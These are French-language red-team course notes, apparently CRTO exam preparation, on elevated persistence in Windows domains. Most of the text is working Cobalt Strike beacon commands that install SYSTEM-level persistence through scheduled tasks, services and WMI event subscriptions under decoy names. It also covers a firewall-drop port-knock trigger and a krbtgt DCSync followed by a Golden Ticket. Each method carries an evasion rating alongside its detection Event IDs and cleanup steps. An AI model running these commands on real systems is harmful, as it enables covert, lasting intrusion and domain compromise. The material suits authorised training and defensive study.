# Elevated Persistence — Accès privilégié  

* Scheduled Task
* Windows Service
* Windows Management Instrumentation WMI

> Chapitre 10 — Elevated Persistence

Après l'obtention d'un accès privilégié, mettre en place une deuxième couche de Persistence pour conserver l'accès si le vecteur initial est corrigé. Toutes les techniques de ce chapitre nécessitent un contexte admin/SYSTEM.

**Privilégier les méthodes sans écriture sur disque ou avec peu d'artefacts : le score OPSEC compte.**

---

## Référence rapide OPSEC

| Technique | OPSEC | Artefact disque | Résiste au redémarrage | Event IDs |
|-----------|-------|---------------|-----------------|-----------|
| **Golden Ticket** | SAFE | Aucun (Attacker Desktop uniquement) | Jusqu'à la rotation de krbtgt | 4662 (DCSync lors de la collecte) |
| **DPERSIST1 (Golden Cert)** | SAFE | Aucun | Jusqu'à l'expiration du certificat CA | Certificate Enrollment (lors de la collecte) |
| **WMI Persistent Event** | CAUTION | Payload EXE sur disque | Oui (WMI repository) | 5861, Sysmon 19/20/21 |
| **Scheduled Task (powerpick)** | CAUTION | Task XML dans Tasks\ | Oui | 4698 |
| **Scheduled Task (SharPersist)** | CAUTION | Task XML dans Tasks\ | Oui | 4698 |
| **Scheduled Task (shell schtasks)** | **UNSAFE** | Task XML dans Tasks\ | Oui | 4698 + child process cmd.exe |
| **Windows Service (SharPersist)** | CAUTION | Binaire service | Oui | 7045, 4697 |
| **Windows Service (shell sc)** | **UNSAFE** | Binaire service | Oui | 7045 + child process cmd.exe |

**Ordre indiqué pour l'examen :** Golden Ticket > DPERSIST1 > WMI Event > Scheduled Task (powerpick) > Service (SharPersist) > Service/Task via shell (à éviter).

---

## Scheduled Tasks

Le Task Scheduler peut exécuter des payloads sous SYSTEM selon un déclencheur : démarrage, connexion, horaire ou événement.

### OPSEC-CAUTION — Méthodes privilégiées

```cs
// Method A: powerpick (no child process — unmanaged PS in beacon thread)
beacon> powerpick $action = New-ScheduledTaskAction -Execute 'C:\Windows\Temp\windbg.exe'; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName 'WindowsDebugHelper' -Action $action -Trigger $trigger -RunLevel Highest -User 'SYSTEM' -Force

// Method B: execute-assembly SharPersist (fork & run — spawns spawnto process)
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\Temp\windbg.exe" -n "WindowsDebugHelper" -m add -o logon

// Verify (powerpick — OPSEC-CAUTION, no child process)
beacon> powerpick Get-ScheduledTask -TaskName 'WindowsDebugHelper' | Select-Object TaskName,State
```

### OPSEC-UNSAFE — À éviter à l'examen

```cs
// UNSAFE — spawns cmd.exe as child of beacon (visible in process tree)
beacon> shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\beacon.exe" /sc onstart /ru SYSTEM /f

// UNSAFE — spawns cmd.exe
beacon> shell schtasks /query /tn "WindowsUpdate" /fo LIST /v
```

### Cleanup — Nettoyage

```cs
// OPSEC-CAUTION — use powerpick, not shell
beacon> powerpick Unregister-ScheduledTask -TaskName 'WindowsDebugHelper' -Confirm:$false

// UNSAFE alternative (avoid):
// beacon> shell schtasks /delete /tn "WindowsDebugHelper" /f
```

### Artefacts de détection

- Event ID **4698** — Création d'une Scheduled Task
- Event ID **4702** — Modification d'une Scheduled Task
- Fichier XML de la tâche écrit dans `C:\Windows\System32\Tasks\<name>`
- Sysmon Event ID **11** (création de fichier) sur le chemin XML de la tâche

---

## Windows Services

Crée un service persistant exécutant un payload sous SYSTEM au démarrage. **Génère l'Event 7045, signal d'alerte exploitable par le SOC : à éviter pendant l'examen sauf dernier recours.**

### OPSEC-CAUTION — Méthode moins bruyante

```cs
// execute-assembly SharPersist (fork & run — no cmd.exe, but Event 7045 still fires)
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\Temp\beacon.exe" -n "WindowsUpdateHelper" -m add

// Verify (powerpick — no child process)
beacon> powerpick Get-Service -Name 'WindowsUpdateHelper' | Select-Object Name,Status,StartType
```

### OPSEC-UNSAFE — À éviter à l'examen

```cs
// UNSAFE — every shell command spawns cmd.exe as child of beacon
beacon> shell sc create "SvcUpdate" binpath= "C:\Windows\Temp\beacon.exe" start= auto
beacon> shell sc description "SvcUpdate" "Windows Update Helper"
beacon> shell sc start "SvcUpdate"
beacon> shell sc qc SvcUpdate
```

### Cleanup — Nettoyage

```cs
// OPSEC-CAUTION — powerpick
beacon> powerpick Stop-Service -Name 'WindowsUpdateHelper' -Force
beacon> powerpick (Get-WmiObject -Class Win32_Service -Filter "Name='WindowsUpdateHelper'").Delete()

// UNSAFE alternative (avoid):
// beacon> shell sc stop SvcUpdate
// beacon> shell sc delete SvcUpdate
```

### Artefacts de détection

- Event ID **7045** — Installation d'un service (System log), **alerte à forte valeur dans ces notes**
- Event ID **4697** — Installation de service (Security log, si audit activé)
- Sysmon Event ID **13** (modification Registry) — `HKLM\SYSTEM\CurrentControlSet\Services\`
- Binaire du service écrit sur disque

---

## WMI Persistence — Événements

Les événements persistants WMI résistent au redémarrage, s'exécutent sous SYSTEM et sont enregistrés dans le WMI repository, pas dans un fichier standard. Trois composants sont nécessaires :

| Composant | Classe | Fonction |
|-----------|-------|---------|
| **Event Filter** | `__EventFilter` | Requête WQL définissant le déclencheur |
| **Event Consumer** | `CommandLineEventConsumer` | Action effectuée lorsque le filtre correspond |
| **Filter-to-Consumer Binding** | `__FilterToConsumerBinding` | Lien entre filtre et consumer |

### Méthode principale — Lab avec psinject (OPSEC-CAUTION)

Méthode du lab CRTO : `psinject` dans le processus du Beacon SYSTEM, sans lancer `powershell.exe` ni de processus temporaire fork & run :

```cs
// Step 1: import the persistence script into beacon's PS runspace
beacon> powershell-import C:\Tools\WmiPersistence.ps1

// Step 2: run the Add function inside the SYSTEM beacon process (no child process)
beacon> psinject [BEACON PID] x64 Add-WmiPersistence

// Verify all three WMI objects were created
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
```

### Alternative — powerpick inline (OPSEC-CAUTION)

Si `WmiPersistence.ps1` est indisponible, créer directement les trois objets WMI avec `powerpick` :

```cs
// 1. Event Filter — trigger on Event ID 1502 (GPO refresh)
beacon> powerpick $f = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{Name='Debug Trace'; EventNamespace='root/cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"}

// 2. CommandLine Event Consumer — executes payload
beacon> powerpick $c = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name='Debug Consumer'; CommandLineTemplate='C:\Windows\System32\windbg.exe -trace'}

// 3. Bind filter to consumer
beacon> powerpick Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c}
```

### Autres conditions de déclenchement

Modifier la chaîne `Query` de l'Event Filter pour changer le déclencheur du Beacon :

```powershell
# Event 1502 — GPO computer configuration refresh (lab default, ~90 min automatic)
"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"

# Event 6013 — System uptime report (fires at every reboot — good secondary trigger)
"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '6013'"

# Process spawn trigger — fires when svchost.exe starts (very frequent)
"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'svchost.exe'"
```

### Déclencheur distant — Port Knock via Firewall Drop (avancé)

**Principe :** activer l'audit des paquets bloqués par le Firewall → l'Event ID 5152 apparaît → filtrer sur un port contrôlé par l'attaquant → le Beacon se déclenche à l'envoi d'un paquet.

```cs
// OPSEC-UNSAFE — shell spawns cmd.exe; note this for reference only
beacon> shell auditpol /set /subcategory:"Filtering Platform Packet Drop" /success:enable /failure:enable

// OPSEC-CAUTION: powerpick alternative for the auditpol step
beacon> powerpick Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Audit' -Name 'AuditFilteringPlatformPacketDrop' -Value 3 -Type DWord

// Event filter — fires when firewall drops a packet on port 4444
beacon> powerpick $f = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{Name='NetFilter'; EventNamespace='root/cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.LogFile='Security' AND TargetInstance.EventCode=5152 AND TargetInstance.Message LIKE '%4444%'"}
// Then bind consumer as above
```

> **Note d'examen :** le Port Knock est avancé et sa configuration est détectable (modification `auditpol`). Dans ces notes, il n'est envisagé que si le déclencheur WMI habituel ne fonctionne pas.

### Énumérer / Vérifier

```cs
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
```

### Tester le déclencheur

```cs
// OPSEC-CAUTION — spawns gpupdate.exe as child process (legitimate, acceptable for testing)
beacon> execute gpupdate /target:computer /force
// DNS beacon should appear within a few seconds
```

### Cleanup — Nettoyage

```cs
// Method A — via psinject (matches install method)
beacon> psinject [BEACON PID] x64 Remove-WmiPersistence

// Method B — inline powerpick (if script not loaded)
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name='Debug Trace'" | Remove-WmiObject
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject

// Remove payload binary
beacon> rm windbg.exe
```

### Artefacts de détection

- Event ID **5861** — Nouvelle activité WMI enregistrée (WMI-Activity/Operational log)
- Modification du WMI repository : `C:\Windows\System32\wbem\Repository\`
- Sysmon Event ID **19** — Création de WMI filter
- Sysmon Event ID **20** — Création de WMI consumer
- Sysmon Event ID **21** — Création du binding filtre-consumer
- Pas d'Event 7045 (aucun service créé)

---

## Golden Ticket — OPSEC sans binaire sur disque

Une fois le hash AES256 de `krbtgt` récupéré via DCSync, le scénario permet de forger des tickets Kerberos de niveau Domain Admin sans déployer de binaire sur la cible.

```cs
// Prerequisite: DCSync for krbtgt hash (OPSEC-CAUTION — Event 4662 on DC)
beacon> dcsync contoso.com CONTOSO\krbtgt

// Get domain SID
beacon> ldapsearch (objectClass=domain) --attributes objectSid

// Forge golden ticket on attacker desktop (NOT in beacon)
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:contoso.com /sid:<domain-SID> /aes256:<krbtgt-aes256> /outfile:C:\Users\Attacker\Desktop\golden

// Inject into beacon session when DA access needed
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN].kirbi
beacon> run klist
beacon> ls \\lon-dc-1\c$
```

**Pourquoi cette Persistence est privilégiée dans les notes :**
- Aucun processus supplémentaire lancé sur les machines cibles
- Aucun fichier écrit sur les hôtes cibles
- Le ticket se trouve uniquement sur l'Attacker Desktop
- Peut rester utilisable après des redémarrages, correctifs et actions d'Incident Response
- Les notes mentionnent l'Event 4662 lors du DCSync comme point de détection principal
- Reste pertinent jusqu'à la rotation du mot de passe `krbtgt` (60 jours par défaut selon ces notes)

---

## Arbre de décision OPSEC

```
Need elevated persistence?
│
├─ Have DA + krbtgt hash?
│   └─ YES → Golden Ticket (SAFE — no footprint on target)
│
├─ Have DA + ADCS in scope?
│   └─ YES → DPERSIST1 Golden Certificate (SAFE — see labs/dpersist1.md)
│
├─ Need binary execution on target (reboot/GPO trigger)?
│   └─ Use WMI Event Subscription (CAUTION — no 7045, WMI repo only)
│       psinject [BEACON PID] x64 Add-WmiPersistence
│
├─ WMI failing or not available?
│   └─ Scheduled Task via powerpick (CAUTION — Event 4698, task XML on disk)
│       powerpick Register-ScheduledTask ...
│
└─ Nothing else works?
    └─ Windows Service via SharPersist (CAUTION — Event 7045, will alert SOC)
       LAST RESORT — always disclose OPSEC cost when choosing this
```

---

## Récapitulatif de sécurité des commandes

| Opération | Commande SAFE | Commande UNSAFE (à éviter) |
|-----------|-------------|----------------------|
| Créer une WMI subscription | `psinject [PID] x64 Add-WmiPersistence` | — |
| Créer des objets WMI inline | `powerpick Set-WmiInstance ...` | — |
| Créer une Scheduled Task | `powerpick Register-ScheduledTask ...` | `shell schtasks /create ...` |
| Créer un service | `execute-assembly SharPersist.exe -t service ...` | `shell sc create ...` |
| Interroger un service | `powerpick Get-Service -Name ...` | `shell sc qc ...` |
| Interroger une Scheduled Task | `powerpick Get-ScheduledTask -TaskName ...` | `shell schtasks /query ...` |
| Arrêter un service | `powerpick Stop-Service -Name ... -Force` | `shell sc stop ...` |
| Supprimer un service | `powerpick (Get-WmiObject -Class Win32_Service -Filter ...).Delete()` | `shell sc delete ...` |
| Supprimer une Scheduled Task | `powerpick Unregister-ScheduledTask -TaskName ... -Confirm:$false` | `shell schtasks /delete ...` |
| Supprimer une WMI subscription | `powerpick Get-WmiObject ... \| Remove-WmiObject` | — |
| Modifier la politique d'audit | `powerpick Set-ItemProperty HKLM:\... AuditFilteringPlatformPacketDrop 3` | `shell auditpol /set ...` |

> **Règle donnée par les notes :** `shell` ou `run` peut créer `cmd.exe` comme child process du Beacon, visible dans l'arbre des processus. Privilégier les équivalents `powerpick`, `execute-assembly` ou `inline-execute` lorsqu'ils existent.

---

*Source : cours ZPS CRTO — Chapitre 10 : Elevated Persistence*
*Dernière mise à jour indiquée : 17/04/2026*
